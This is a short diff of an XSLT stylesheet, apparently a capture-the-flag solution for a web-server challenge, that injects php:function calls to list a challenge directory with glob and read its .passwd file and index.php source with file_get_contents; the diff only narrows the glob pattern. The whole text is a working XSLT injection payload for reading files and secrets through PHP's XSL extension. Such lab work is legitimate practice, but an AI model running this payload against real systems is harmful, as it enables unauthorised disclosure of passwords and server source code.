@@ -1,4 +1,3 @@
-
 <xsl:stylesheet version="1.0"
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
 xmlns:php="http://php.net/xsl"
@@ -11,7 +10,7 @@ extension-element-prefixes="user111"
 function test6(){return "hello world!";}
 ]]></xsl:text>
 </msxsl:script>
-<xsl:param  name="shandle"    select="php:function('glob','/challenge/web-serveur/ch50/.*')" disable-output-escaping="yes"/>
+<xsl:param  name="shandle"    select="php:function('glob','/challenge/web-serveur/ch50/.p*')" disable-output-escaping="yes"/>
 <xsl:param  name="strscand"   select="php:function('file_get_contents','/challenge/web-serveur/ch50/.passwd')" disable-output-escaping="yes"/> 
 <xsl:param  name="header"     select="php:function('file_get_contents','/challenge/web-serveur/ch50/index.php')" disable-output-escaping="yes"/>
 <xsl:template match="/">	
